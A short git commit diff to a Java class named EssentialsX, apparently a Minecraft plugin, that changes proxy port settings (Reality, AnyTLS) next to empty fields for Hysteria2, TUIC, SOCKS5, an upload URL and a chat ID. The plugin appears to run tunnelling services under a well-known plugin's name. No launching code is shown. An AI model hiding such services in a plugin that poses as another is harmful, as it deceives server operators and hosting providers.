46ff6e3925838bdd05409491aafcee854b2afccd
qlxi <98650473+qlxi@users.noreply.github.com>
2026-03-01 11:18:02 +0300

    Update EssentialsX.java

--- src/main/java/com/example/essentialsx/EssentialsX.java
+++ src/main/java/com/example/essentialsx/EssentialsX.java
@@ -84,8 +84,8 @@ public class EssentialsX extends JavaPlugin {
         env.put("S5_PORT", "");
         env.put("HY2_PORT", "");
         env.put("TUIC_PORT", "");
-        env.put("ANYTLS_PORT", "29262");
-        env.put("REALITY_PORT", "28415");
+        env.put("ANYTLS_PORT", "");
+        env.put("REALITY_PORT", "32000");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "");
